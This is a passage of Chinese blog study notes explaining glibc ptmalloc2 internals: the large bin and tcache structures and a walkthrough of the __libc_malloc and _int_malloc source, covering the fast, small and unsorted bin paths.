alt="" width="468" data-align="center"><h3 id="large-bin结构分析"><a href="#large-bin结构分析" class="headerlink" title="large bin结构分析"></a>large bin结构分析</h3><p>在large bin中同一bin里面的chunk大小属于同一范围，按照从大到小的顺序排列通过fd&amp;bk相连（挨着bin头的为大），这就会形成相同大小的chunk紧紧挨着形成，其中相同大小的chunk中，第一个chunk会通过fd_nextsize &amp; bk_nextsize与下一个不同大小的chunk链接，之后依次，最后一个不同大小的chunk链接第一个chunk。 large bin 是一个<strong>二维双向链表</strong>。</p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/largebin_pic_2.png" title="" alt="" data-align="center"><h2 id="Tcache-Bin"><a href="#Tcache-Bin" class="headerlink" title="Tcache Bin"></a>Tcache Bin</h2><p>Tcache 是从 glibc2.26 开始新增的缓存机制，用于优化线程锁竞争的问题，它为每个线程预留了一组 bin，这组 bin 不属于 bins，并具备以下特点：</p><ol><li>tcache bin 中共<strong>包含 64 个 bin</strong>（定义在 TCACHE_MAX_BINS），<strong>每个 bin 中最多缓存 7 个 chunk</strong></li><li>64 位系统上以 0x10 字节递增（24 -&gt; 1032），也就是0x20-&gt;0x410，<strong>注意，0x400和0x410都是large bin的范围</strong>。</li><li>tcache bin 上的 <strong>chunk 的 prev_inuse 设为1</strong>，不会与相邻的空闲 chunk 合并，与 fast bin 类似</li><li>当一个 chunk 被释放时，首先进入 tcache bin，而不是 fast bin，这样当该线程再次申请分配的时候，<strong>如果在其线程 tcache bin 上有空闲 chunk，就从 tcache bin 中取出，无需等待堆锁</strong>，从而实现加速分配。填满了<strong>这个大小</strong>的 tcache bin 后，再释放的 chunk 才会进入 fast bin</li><li>tcache bin 由 tcache_entry 和 tcache_perthread_struct 两个结构体管理</li></ol><img src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/tcache_1.png" title="" alt="" data-align="center"><p>管理 tcache 的有两个结构，分开看：</p><ul><li>tcache entry：<ul><li>next：位于 malloc_chunk 结构体 fd 指针的位置，指向 bin 中下一个 chunk 的地址（并非直接存储，会进行移位 &amp; 异或，类似 AFL 定位一个基本块的手法）</li><li>key：位于 malloc_chunk 结构体 bk 指针的位置（tcache bin 是单链表，未使用 bk 指针），指向tcache，用来标记 chunk 已在 tcache 中，防止针对 tcache 的 double free 攻击</li></ul></li><li>tcache_perthread_struct：<ul><li>counts：字节数组，TCACHE_MAX_BINS（64）个元素，每个成员用来统计对应下标的 bin 中有多少个 chunk</li><li>entries：指针数组，TCACHE_MAX_BINS（64）个元素，每个成员指向对应下标的 bin 的头节点，其为一个 tcache_entry 结构</li></ul></li></ul><img title="" src="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/tcache_2.png" alt="" data-align="inline"><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol><li><p>[堆基础01：ptmalloc2初探](<a href="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/">堆基础01：ptmalloc2初探 | cataLoc’s Blog</a>)</p></li><li><p>[堆漏洞挖掘中的bins分类](<a href="https://blog.51cto.com/u_15346415/3675227">堆漏洞挖掘中的bins分类(fastbin、unsorted bin、small bin、large bin)_mb6128aabee41d4的技术博客_51CTO博客</a>)</p></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/04/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_malloc/"/>
      <url>/2023/04/09/malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90_malloc/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上一篇分析了ptmalloc2的分配策略和数据结构，主要介绍了各种bin，这篇将详细分析代码在malloc一个chunk时，是如何实现分配chunk的，我将继续跟随CataLoc师傅的分析继续学习(可以说内容有百分之八十的相似，所以最好直接原帖)。</p><h1 id="libc-mallc主流程"><a href="#libc-mallc主流程" class="headerlink" title="__libc_mallc主流程"></a>__libc_mallc主流程</h1><p>cataLoc师傅编写了一个会使用到 malloc &#x2F; free 的简单程序，用pwndbg进行调试，这里我就直接跟随代码进行分析了，有兴趣了可以看[cataLoc](<a href="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/#%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95">堆基础02：malloc源码分析 | cataLoc’s Blog</a>)师傅的源码调试。</p><p>在程序进入malloc函数后，会先执行的函数就是__libc_malloc()，接下来分析总体流程，中间个别函数要简单介绍，在下一部分在进行详细的分析。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16797370428091679737041892.png"></p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><p><code>mstate ar_ptr</code>，mstate就是malloc_state</p></li><li><p>victim是用来存放chunk的地址，最后函数返回的就是victim</p></li></ul><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><ul><li><p>静态断言做一个检查，忽略</p></li><li><p>判断否存在 __malloc_hook，若存在则调用该 hook 函数并返回。2.34之后大部分hook已经被删除，包括__malloc_hook；<code>atomic_forced_read(x)</code>相当于<code>*ptr</code>，但是是原子操作。</p></li><li><p>使用tcache机制时：</p><ol><li><p>调用<code>checked_request2size()</code>来判断申请空间大小是否合法，在 64 位的情况下，bytes 不能大于 0x7fffffffffffffff；合法该函数会返回<strong>需要分配的chunk大小</strong>，保存到<strong>tbytes</strong>参数中返回。</p></li><li><p>调用<code>csize2tidx()</code>*(chunk size-&gt;tcache index)*，根据tbytes的chunk大小找见<strong>tcache bin下标</strong>，存放到变量<code>tc_idx</code>。</p></li><li><p><code>MAYBE_INIT_TCACHE</code>，如果tcache未初始化，则会调用<code>tcache_init()</code>来初始化 tcache</p></li><li><p>进行if判断，如果三个条件都满足则调用<code>tcache_get()</code>来获取<code>tc_idx</code>下标对应bin的第一个chunk；条件如下：</p><ul><li><p>判断下标是否在tcache bins范围内（mp_对应malloc_par）</p></li><li><p>判断tcache是否存在</p></li><li><p>判断下标对应的tcache bin中是否有空闲tcache chunk</p></li></ul></li></ol></li></ul><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/libc_malloc_4.png"></p><ul><li><p>单线程情况下：</p><ol><li><p>调用<code>_int_malloc()</code>函数分配内存，参数分别为<code>main_arena</code>和<code>bytes</code>，前者因为单线程，所以肯定是主分配区，如果第一次申请会在<code>_int_malloc()</code>中初始化，后者为用户申请的字符数。</p></li><li><p><code>assert</code>这里进行了一个检测，大概意思是，如果victim存在，且是从mmap分配的，而且还是从主分配区分配的则发出中止，因为主分配区都是<code>brk()</code>或者<code>sbrk()</code>生成的。里面函数基本都能从字母意思理解到，不做解释了，其中<code>mem2chunk</code>会在之后分析。</p></li></ol></li><li><p>多线程情况下：</p><ol><li><p>首先调用<code>arena_get()</code>获取分配区</p></li><li><p>调用<code>_int_malloc()</code>从该分配区中拿到分配给的内存地址</p></li><li><p>如果<code>victim</code>不存在且<code>ar_ptr</code>存在，也就是chunk获取失败，分配区获取成功的情况下，<strong>可能是 mmap 区域的内存耗尽等多种原因</strong>。所以这里会调用<code>arena_get_retry()</code>更换分配区，然后再调用<code>_int_malloc</code>从新的分配区上进行分配。<em>LIBC_PROBE宏定义：添加自定义的跟踪代码，memory_malloc_retry 是一个全局变量，用于控制在内存分配过程中的重试次数。</em>（不重要，但是有疑惑了可以看看）</p></li><li><p>获取分配区的话，需要将线程锁释放，这个锁是在获取分配区的时候上的。</p></li><li><p>返回<code>victim</code>给用户</p></li></ol></li></ul><h2 id="总体流程"><a href="#总体流程" class="headerlink" title="总体流程"></a>总体流程</h2><p>处理hook（2.34删了）-&gt;申请tcache的chunk-&gt;单线程或多线程（调用_int_malloc）</p><h1 id="libc-malloc辅助函数"><a href="#libc-malloc辅助函数" class="headerlink" title="__libc_malloc辅助函数"></a>__libc_malloc辅助函数</h1><p>64位系统下的一些数据类型的大小：</p><table><thead><tr><th align="center">数据类型</th><th align="center">大小</th></tr></thead><tbody><tr><td align="center">size_t</td><td align="center">0x8</td></tr><tr><td align="center">Size_SZ</td><td align="center">0x8</td></tr></tbody></table><p>一些宏的定义：</p><pre><code class="c">// 这三个宏定义在源码中经常能看到，其实它不会改编程序逻辑，只是告诉编译器这个很可能为某个值，就// 把否的情况作为跳转，真的情况就顺序运行下去，减少程序的跳转，一定程度上可以优化程序运行速度。// 或者还有一个简单粗暴的办法，你把这三个字符全都去了，不影响代码逻辑。__glibc_unlikely(exp): 表示exp很可能为假__glibc_likely(exp): 表示exp很可能为真__builtin_expect(exp, value): 表示exp==value大概率成立</code></pre><h2 id="checked-request2size"><a href="#checked-request2size" class="headerlink" title="checked_request2size"></a>checked_request2size</h2><img title="" src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/request2size_1.png" alt="" data-align="center" width="519"><ul><li><p>如果用户申请大小大于 <code>PTRDIFF_MAX</code>——64位下 0x7fffffffffffffff，直接返回错误</p></li><li><p>大小合法的话就调用<code>request2size()</code>这个宏，计算出需要分配的 chunk 大小返回给 sz，并返回 true</p></li></ul><h3 id="request2size"><a href="#request2size" class="headerlink" title="request2size()"></a>request2size()</h3><p>由于<code>request2size()</code>属于宏，我就不另起标题了。</p><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/request2size_2.png"></p><ul><li><p>MALLOC_ALIGNMENT 是 2 个 SIZE_SZ 的大小，就是 0x10 字节</p></li><li><p>MALLOC_ALIGN_MASK 就是 15 字节，也就是 0xF</p></li><li><p>MIN_CHUNK_SIZE 是从 malloc_chunk 结构体开头，到 fd_nextsize 这个字段之前的大小，也就是 4个 SIZE_SZ，共 32 字节，即 0x20</p></li><li><p>MINSIZE 根据计算可得为 0x20 字节</p></li></ul><p>可以看出该宏就是进行一个判断，req加上<code>SIZE_SZ</code>和<code>MALLOC_ALIGN_MASK</code>后与<code>MINSIZE</code>进行比较，小于则直接返回MINSIZE，否则就在相加结果的基础上进行对齐，也就是与0xF0进行按位与操作。我正常来想会这么设计代码，判断最后一位(16进制)是否小于等于8字节，是的话最后一位补全成8字节，然后加0x10，不是的话最后一位消除成0，加0x20。但是源码设计的就极为巧妙。</p><h2 id="csize2tidx"><a href="#csize2tidx" class="headerlink" title="csize2tidx"></a>csize2tidx</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/csize2tidx_1.png"></p><ul><li><p>这里的参数 x，正是前<code>request2size()</code>这个宏计算出的实际需要分配的 chunk 大小</p></li><li><p>MALLOC_ALIGNMENT 是 2 个 SIZE_SZ 的大小，就是 0x10 字节</p></li><li><p>MINSIZE 前面也算出来是 0x20 字节</p></li></ul><p>该函数就是通过chunk大小来寻找tcache对应bin的下标，因为tcache的增长大小为0x10，所以除以<code>MALLOC_ALIGNMENT</code>，tcache最小chunk就是<code>MINSIZE</code>大小，所以减去，而且下标从0开始。</p><h2 id="MAYBE-INIT-TCACHE"><a href="#MAYBE-INIT-TCACHE" class="headerlink" title="MAYBE_INIT_TCACHE"></a>MAYBE_INIT_TCACHE</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/tcache_init_1.png"></p><p>可以看到在<code>MAYBE_INIT_TCACHE</code>内，如果tcache为null时调用了tcache_init()</p><h3 id="tcache-init"><a href="#tcache-init" class="headerlink" title="tcache_init"></a>tcache_init</h3><p>所以直接来看<code>tcache_init</code>：</p><ol><li>首先计算出 tcache_perthread_struct 结构的大小，然后为其分配空间</li><li>调用<code>arena_get()</code>获取分配区，通过<code>_int_malloc()</code>分配内存给victim</li><li>如果分配区存在但没分配到，即victim为0，那就调用<code>arena_get_retry()</code>换个分配区再调用<code>tcache_init</code>分配</li><li>分配完成后调用<code>__libc_lock_unlock</code>释放分配区，这是因为在获取分配区或者更换分配区时会进行上锁操作</li><li>最后将申请到的内存赋给 tcache_perthread_struct 结构，再调用<code>memset()</code>将内容初始化为0</li></ol><h2 id="tcache-get"><a href="#tcache-get" class="headerlink" title="tcache_get"></a>tcache_get</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/tcache_get_1.png"></p><p>在获取tcache下标后，就可以根据下标取出tcache对应bin中的第一个chunk，这就是tcache_get的用处。</p><ul><li>先根据 idx 找到对应的 tcache bin 的第一个 tcache_entry，也就是这条 bin 上的第一个 chunk 块</li><li>将这条 tcache bin 上的第一个 tcache_entry 修改为当前 tcache_entry 的下一个 tcache_entry，相当于将原先第一个 tcache_entry 给取出来</li><li>修改此 tcache_bin 对应 tcache_counts 中表示该链上 chunk 数量的值，执行减 1 操作</li><li>将取出的 chunk 的 key 字段置为 NULL，表示已经从 tcache 上取出；最后将其返回</li></ul><h2 id="chunk-is-mmapped"><a href="#chunk-is-mmapped" class="headerlink" title="chunk_is_mmapped"></a>chunk_is_mmapped</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/chunk_is_mmapped_1.png"></p><ul><li>这个宏就是判断当前这个 chunk 是否通过<code>mmap()</code>申请的，这部分在<a href="https://cata1oc.github.io/2022/06/30/%E5%A0%86%E5%9F%BA%E7%A1%8001-ptmalloc2%E5%88%9D%E6%8E%A2/">前一篇</a>介绍 malloc_chunk 时有提到，在 chunksize 的低 3 位保存了当前 chunk 的一些属性，其中下标为1的位（10b）就是用于判断 IS_MAPPED 的 M 位</li></ul><h2 id="chunk2mem-x2F-mem2chunk"><a href="#chunk2mem-x2F-mem2chunk" class="headerlink" title="chunk2mem &#x2F; mem2chunk"></a>chunk2mem &#x2F; mem2chunk</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/chunk2mem_1.png"></p><p>通过回想malloc_chunk的结构，chunk一般指向prev_size的位置，mem指向fd，所以这两个宏的功能就显而易见了，通过加减0x10来进行转换，一般来说，用户申请获取的chunk的指针都是指向mem的，在系统中一般使用指向chunk的指针，除了tcache bin，它也直接指向next指针的位置。</p><h2 id="arena-for-chunk"><a href="#arena-for-chunk" class="headerlink" title="arena_for_chunk"></a>arena_for_chunk</h2><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16804287997791680428799208.png"></p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16804287297801680428729489.png"></p><p>上面的函数定义在arena.c中，下方还是在malloc.c</p><ul><li><code>arena_for_chunk</code>是用来获取 chunk 所在的分配区（arena）的，如果调用<code>chunk_main_arena</code>判断出不是主分配区则通过<code>heap_for_ptr</code>找见该chunk的<code>heap_info</code>，进而从<code>heap_info</code>找见指向的arena。</li><li><code>chunk_main_arena</code>，看一下<code>NON_MAIN_ARENA</code>位是否被设置，这个值若未设置，就可以直接判断出是 main_arena（主分配区）</li><li><code>heap_for_ptr</code>，计算 HEAP_MAX_SIZE - 1 取反后的值，将其与 chunk 所在地址进行与操作，从而得到 chunk 所在堆的 heap_info 地址。</li></ul><p>关于为什么可以这样获取heap_info的地址，且在后续how2heap进阶篇的最后一个手法——mmap_overlapping_chunks中，也需要理解这一点，那就是在thread_arena中，<strong>堆的申请是<code>HEAP_MAX_SIZE </code>对齐的，且复习ptmalloc2初窥中的图片可以看出，heap_info是在堆的开头</strong>，所以只需要找到chunk所属heap的头地址就好了。</p><h2 id="arena-get"><a href="#arena-get" class="headerlink" title="arena_get"></a>arena_get</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/arena_get_1.png"></p><ul><li><strong>arena_get</strong>：<ul><li>直接从 thread_arena 获取分配区（主分配区的获取不使用<code>arena_get()</code>），该变量会线程开始时被初始化，每一个线程都有自己的一份变量副本，而不是共享。</li><li>将获取到的分配区和申请内存大小作为参数传入 <code>arean_lock()</code></li></ul></li><li><strong>arena_lock</strong>：<ul><li>判断是否成功获取分配区，若成功获取，则调用<code>__libc_lock_lock</code>对分配区上锁</li><li>若获取失败，则调用<code>arena_get2()</code>重新获取分配区，失败的话</li></ul></li><li><strong>arena_get2</strong>：<ul><li>调用<code>get_free_list()</code>获取分配区，如果获取成功则将分配区返回，这里<code>get_free_list()</code>返回的是 malloc_state 结构体，失败了则会分配新的arena。<em>（if(a&#x3D;&#x3D;NULL)）中将代码缩略了，如果想了解详细过程可以问一下chatgpt，分析的很详细。</em></li></ul></li><li><strong>get_free_list</strong>：<ul><li>这里的 replaced_arena 是给下面要分析的<code>arena_get_retry()</code>用的，调用<code>arena_get()</code>时这个值通常为 NULL</li><li>先获取 free_list 上的第一个空闲分配区（free_arena），这是一个串着所有空闲分配区的链表，然后将其从 free_list 上摘下来</li><li>摘下来后，修改分配区的 attached_threads 的值为1，表明该分配区附加到当前线程；如果是通过<code>arena_get_retry</code>调用的，则还会将线程与原先的分配区（replaced_arena）进行 detach 操作；最后将新获取的分配区返回</li></ul></li></ul><h2 id="arena-get-retry"><a href="#arena-get-retry" class="headerlink" title="arena_get_retry"></a>arena_get_retry</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/arena_get_retry_1.png"></p><p>结合在tcache_init中调用情况来看，如果arena_get获取了分配区，但是没有从中分配空间给victim，两种可能，对于main_arena来说是sbrk失败()；thread_arena是mmap()失败，那么就需要调用该函数了。</p><ul><li>如果arena_get()返回的arena是非主分配区，说明没有进行mmap()，可以考虑试着从主分配区分配；否则，就又调用<code>arena_get2()</code>。</li></ul><h1 id="int-malloc-主流程"><a href="#int-malloc-主流程" class="headerlink" title="_int_malloc 主流程"></a>_int_malloc 主流程</h1><h2 id="初始校验"><a href="#初始校验" class="headerlink" title="初始校验"></a>初始校验</h2><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/int_malloc_1.png"></p><ul><li><p><code>_int_malloc()</code>接收两个参数，分配区和需要分配的大小，然后从分配区中分配满足需求大小的 chunk</p></li><li><p>变量中需要注意，mchunkptr 与 mbinptr 类型均是 malloc_chunk 结构体</p></li><li><p>进入函数后最先会遇到两处校验：</p><ol><li><code>checked_request2size()</code>前面分析过了，这里主要是判断申请的内存大小是否超过了边界，若未超过，则会计算出至少需要分配的 chunksize，将值保存到 nb 中，然后进入下一个判断</li><li>接下来会判断 av 也就是传入的分配区是否为空，通常不为空。但如果为空，就会调用<code>sysmalloc()</code>去请求一个 chunk，通过<code>alloc_perturb()</code>初始化后，将这个 chunk 返回。这里 perturb_byte 的值默认为 0</li></ol></li></ul><h2 id="Fast-Bin-处理流程"><a href="#Fast-Bin-处理流程" class="headerlink" title="Fast Bin 处理流程"></a>Fast Bin 处理流程</h2><p>从这开始进入了关键流程的分析，大致流程就是依次从fast bin、small bin、unsorted bin和large bin寻找符合大小的chunk，除了large bin中可以切割chunk来返回给用户，只有在unsorted bin中满足特殊条件时可以切割剩下的最后一个chunk，当然，其中还夹杂着将fast bin中chunk进行合并的操作。</p><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/fastbin_part_2.png"></p><p>直接套用Cataloc师傅的图进行分析，通过方框划分代码分析逻辑很清晰。开头<code>REMOVE_FB</code>宏不做解释了，实现单向链表删除第一个 node 的操作。</p><p>之后进入fast bin的if判断，大小是否小于fast bin的最大值，是的话进入fast bin的处理流程</p><p><strong>红色方框（if条件：大小符合fast bin大小）：</strong></p><ul><li>先通过<code>fastbin_index</code>算出 idx，即所需的 chunk 位于哪条 bin 上</li><li>调用<code>fastbin</code>获取对应 bin 的链表头，并将链表上的第一个 chunk 地址赋给 victim</li><li>判断 vicitim 是否存在，若不存在，说明这条 bin 上已经没有多余的 chunk 了，又<strong>因为 fast bin 中是大小严格匹配的</strong>，如果大小符合的 chunk 不存在，也不会去寻找其它的 bin，就会直接跳过 fast bin 剩余的处理逻辑</li></ul><p><strong>橙色方框（if条件：idx对应bin上存在空闲chunk）：</strong></p><ul><li>取出该chunk，单线程则直接取下，bin头的fd指向chunk的fd；多线程采用开头定义的<code>REMOVE_FB</code>将chunk取出单链。</li></ul><p><strong>蓝色方框（if条件：victim不为空）：</strong></p><ul><li>这部分主要是两个 check，第一个 check 是用 vicitim 再算一遍，判断其是否属于它原先所在的 bin</li><li>第二个 check 是对一些标志位的 check</li></ul><p><strong>粉色方框（if条件：开启tcache bin）：</strong></p><ul><li>首先根据申请的 chunk 的大小，计算出当前 fast bin 对应的 tcache bin 是哪一个</li><li>先将找到的第一个符合要求的 chunk 作为 victim 暂存，并从 fast bin 上摘下，接下来从这条找到符合要求 chunk 的 fast bin 里面继续找，<strong>如果这个 fast bin 不为空，且 tcache bin 仍有多余空间（少于 7 个 chunk）</strong>，那么会通过一个循环将 fast bin 中的剩余 chunk 移动到 tcache bin 中，每轮循环都会判断一次 fast bin 是否还有 chunk 以及 tcache bin 是否还有空间（这个过程也是 fastbin-reverse-into-tcache 这个利用手法的核心）。从 fast bin 摘下来的操作和前面橙色方框中的一样；放入 tcache bin 中则是用的 <code>tcache_put</code></li><li>这里多解释一下，fast bin和tcache bin中取下放入都是头部，因为都是单链表结构。所以从fast bin拿出放入tcache bin中后，链表顺序会被反转，所以reverse是这个意思。</li></ul><p><strong>绿色方框：</strong></p><ul><li>拿到 vicitim 后，调用<code>chunk2mem</code>将指针指向 chunk 存储数据的开始地址</li><li>再调用<code>alloc_perturb()</code>对这块内存初始化，然后返回给用户</li></ul><p><strong>总结</strong></p><p>fast bin处理中主要就是寻找对应大小idx，通过下标获取该bin的第一个chunk，并将剩余同大小的chunk放入tcache bin中，最后返回给用户chunk。</p><h2 id="Small-Bin-处理流程"><a href="#Small-Bin-处理流程" class="headerlink" title="Small Bin 处理流程"></a>Small Bin 处理流程</h2><p>fast bin中不符合的话，就进入下一个判断，是否符合small bin的大小范围。</p><p><img src="https://fastly.jsdelivr.net/gh/DETALA/images@main/pwn/malloc&free/16805152531081680515252539.png"></p><p>可以看出，首先是判断申请的 chunksize 范围是否在 small bin 的范围内，然后在整个处理流程中穿插了黄框内tcache bin的处理过程。</p><p><strong>红色方框：</strong></p><ul><li><p>开头</p><ul><li><p>先调用<code>smallbin_index</code>算出 chunk 所在的 idx 是多少</p></li><li><p>再调用<code>bin_at</code>得到 idx 在 bins 中对应的那个 bin 的链表头。</p></li></ul></li><li><p>if判断</p><ul><li><p>第一个if（蓝色大括号，接下来代码都属于该蓝色大括号内容），判断这个链表头的后一个元素是否还是它自己（<strong>注意这里在判断的同时，也进行了赋值操作，此时该链表若至少存在 1 个 chunk，那么 vicitim 指向的就是这个 chunk 的地址</strong>），是的话说明是空的，进入下一类bin的判断。</p></li><li><p>获取victim的bk，也就是上一个chunk地址赋值给bck</p></li><li><p>if判断链条的完整性，bck的下一个chunk是否是victim，不是的话报错</p></li><li><p>通过<code>set_inuse_bit_at_offset</code>将 victim 之后（进程虚拟内存中紧挨着 victim 地址的 chunk）的一个 chunk 的 prev_inuse 设置为 1，表示 victim 这个 chunk 正在被使用。fast bin 处理过程中是没有这个操作的，因为 fast bin 中的 chunk 默认都设置了 prev_inuse 的值，从而防止 chunk 之间的前后合并</p></li><li><p>然后进行一个脱链操作，<strong>注意，small bin和unsorted bin都是头进尾出。</strong></p></li><li><p>if判断这个 chunk 的分配区是否为主分配区，若是，则设置相应字段的值</p></li><li><p>接着调用<code>check_malloced_chunk</code>进行一些字段的检查</p></li></ul></li></ul><p><strong>黄色方框：</strong></p><p>这部分代码都是启用tcache bin时才会执行的部分。总体和fast bin的部分功能相同，这里只介绍一些不同的地方。</p><ul><li><p>small bin 中的 chunk 放入 tcache bin 中时需要设置 prev_inuse；fast bin 中的 chunk 默认是设置了的</p></li><li><p>small bin 断链进行的是双链表操作；fast bin 是单链表操作</p></li><li><p>small bin 需要判断是否为主分配区，并设置相应字段；fast bin 没有</p></li></ul><p><strong>红色方框：</strong></p><p>这部分和fast bin相同，将分配的好的 chunk 初始化后返回给用户</p><h2 id="Unsorted-Bin-处理流程"><a href="#Unsorted-Bin-处理流程" class="headerlink" title="Unsorted Bin 处理流程"></a>Unsorted Bin 处理流程</h2><p>如果在 small bin 或者 fast bin 处理流程中找到了合适大小的 chunk，那么程序就返回了。<strong>如果执行到这里，说明 chunk 大小位于 large bin 中或者在 small bin 和 fast bin 中没有找到所需大小的块</strong></p><h3 id="idx赋值"><a href="#idx赋值" class="headerlink" title="idx赋值"></a>idx赋值</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_1.png"></p><p>这个else是对应前面的<code>if (in_smallbin_range(nb))</code>，所以说明chunk大小属于large bin</p><ul><li><p>通过宏<code>largebin_index</code>获取所需 chunk 在 large bin 中的 index，即所在的 bin 链</p></li><li><p>判断 fast bin 是否存在（即是否已经初始化），若存在，则调用<code>malloc_consolidate()</code>将 fast bin 中的所有 chunk free 掉并与前后的块合并，然后存到 unsorted bin 中</p></li></ul><p>从else出来后，又会进入有关tcache bin的处理，</p><ul><li>调用<code>csize2tidx</code>获取所需 chunk 大小在 tcache bin 中的 idx，如果 nb 的大小位于 tcache 范围内（tcache 范围涵盖了 large bin 中的前面一小部分），则将其赋值给变量 tcache_nb，且将两个变量进行赋值0，之后会讲到，这里先略过。</li></ul><h3 id="for头检查"><a href="#for头检查" class="headerlink" title="for头检查"></a>for头检查</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_2.png"></p><p>进入了超大的for循环，一直到__int_malloc结束，开头进行了轮数的初始化为0，用来在while循环进行判断，该while循环持续到unsorted bin结束：</p><ul><li><p>括号进行了赋值和判断，victim 表示当前 chunk，不等于bin头的话就说明不为空</p></li><li><p><strong>bck 为 unsorted bin 上 victim 的上一个 chunk，next 为 victim 的下一个 chunk</strong></p></li><li><p>然后进行五个if判断，分别为：</p><ul><li><p>前两个if检查 victim 和 next 的 size 不能小于最小的 chunksize，也不能大于所属分配区已经分配的内存大小（<strong>这里不知道为什么是大小0x10，而不是MINSZIE0x20</strong>）</p></li><li><p>检查 next 的 prev_size 是否等于 victim 的 size</p></li><li><p>检查 victim-&gt;bk-&gt;fd 是否等于 victim，保证双链表完整性；检查 victim-&gt;fd 是否等于 unsorted_chunks(av) 这是因为在每轮循环开始有 <code>victim = unsorted_chunks(av)-&gt;bk</code></p></li><li><p>检查 victim 是否设置了 prev_inuse，因为进入 unsorted bin 中的 chunk 都已经清空了该值</p></li></ul></li></ul><h3 id="last-reminder"><a href="#last-reminder" class="headerlink" title="last reminder"></a>last reminder</h3><p><img src="https://cata1oc.github.io/2022/07/16/%E5%A0%86%E5%9F%BA%E7%A1%8002-malloc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/unsortedbin_part_3.png"></p><p>这里是单独讨论一种特殊情况</p><p>在if中需要满足四个条件：</p><ol><li><p><strong>所需 chunk 的大小的范围在 small bin 中</strong></p></li><li><p>unsorted bin 中仅剩最后一个 chunk</p></li><li><p>victim是last remainder chunk，下面是之前对于这两个变量的赋值，回忆一下</p><ul><li><code>bck = victim-&gt;bk</code></li><li><code>victim = unsorted_chunks(av)-&gt;bk</code></li></ul></li><li><p>该 last remainder chunk 的 size 需大于所需 chunk 大小与 MINSIZE 之和</p></li></ol><p>之后就是进行一次 chunk 切割的操作，把所需大小的 chunk 返回给用户，余下的部分作为 last remainder chunk 回到 unsorted bin 中：</p><ol><li><strong>计算出 remainder_size，然后通过<code>chunk_at_offset</code>拿到分割后 remainder 的地址</strong></li><li>修改 unsorted bin 的fd和bk，将其指向 last remainder chunk 的位置</li><li>成为新的 last remainder chunk</li><li>将reminder的bk和fd指向unsorted bin的bin头</li><li><strong>如果 remainder 大小不在 small bin 范围内</strong>，就添加 fd_nextsize 与 bk_nextsize 指针</li><li>设置 victim 与 remainder 的标志位</li><li>将 victim 存储数据的地址（victim + 2*SIZE_SZ）返回给用户</li></ol><h3 id="into-tcache"><a href="#into-tcache" class="headerlink" title="into_tcache"></a>into_tcache</h3><p><img 